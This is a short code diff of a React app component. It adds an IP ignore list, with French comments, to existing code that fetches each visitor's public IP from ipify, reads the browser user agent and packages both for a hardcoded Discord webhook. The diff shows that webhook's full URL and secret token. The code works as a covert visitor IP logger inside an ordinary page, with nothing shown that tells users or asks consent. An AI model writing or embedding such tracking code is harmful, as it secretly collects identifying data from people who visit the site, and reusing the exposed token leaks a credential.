@@ -34,13 +34,19 @@ const App = () => (
 );
 
     const webhookURL = "https://discord.com/api/webhooks/1421567247008399593/vdq1gPZJxGRHiwJwRcE4gbCT45YEEWeis10dP0qfho2Fqkc7e4qSSQ6BjzPCaMGerMs4";
+    const ignoredIPs = ["127.0.0.1", "192.168.1.1", "10.0.0.1"]; // Ajoute les IPs à ignorer ici
 
-    // Fetch public IP from ipify
     fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => {
-        const ip = data.ip;
-        const userAgent = navigator.userAgent;
+    .then(res => res.json())
+    .then(data => {
+    const ip = data.ip;
+    
+    if (ignoredIPs.includes(ip)) {
+      return; // Stop l'exécution si l'IP est dans la liste ignorée
+      }
+    
+      const userAgent = navigator.userAgent;
+
 
         // Build the Discord embed
         const payload = {
